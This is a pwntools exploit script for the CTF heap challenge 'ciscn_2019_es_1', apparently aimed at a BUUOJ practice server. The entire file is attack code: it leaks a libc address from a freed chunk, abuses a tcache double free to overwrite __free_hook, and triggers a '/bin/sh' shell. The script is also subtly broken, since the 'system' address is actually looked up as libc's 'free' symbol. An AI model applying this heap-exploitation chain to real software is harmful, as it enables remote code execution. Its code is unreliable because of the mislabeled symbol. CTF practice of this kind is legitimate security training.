#coding:utf-8
from pwn import *
import pwnlib
from LibcSearcher import *
# sh = process(['./ciscn_2019_es_1'],env={"LD_PRELOAD":"./libc-2.27.so"})
# sh =process("./ciscn_2019_es_1")
context.log_level = 'debug'
sh = remote("node3.buuoj.cn",28130)
libc = ELF("./libc-2.27.so")
elf = ELF("./ciscn_2019_es_1")

def add(size,name,content):
    sh.recvuntil("choice:")
    sh.sendline("1")
    sh.recvuntil("Please input the size of compary's name\n")
    sh.sendline(str(size))
    sh.recvuntil("please input name:\n")
    sh.send(name)
    sh.recvuntil("please input compary call:\n")
    sh.send(content)

def show(index):
    sh.recvuntil("choice:")
    sh.sendline("2")
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(index))

def dele(index):
    sh.recvuntil("choice:")
    sh.sendline("3")
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(index))

add(0x410,"1111","aaaa")
add(0x28,"2222","bbbb")
add(0x28,"/bin/sh\x00","cccc")
dele(0)
show(0)
sh.recvuntil("name:\n")
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - 0x3ebca0
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['free']
dele(1)
dele(1)
add(0x28,p64(free_hook),"dddd")
add(0x28,"5555","eeee")
add(0x28,p64(system_addr),"ffff")
dele(2)
sh.interactive()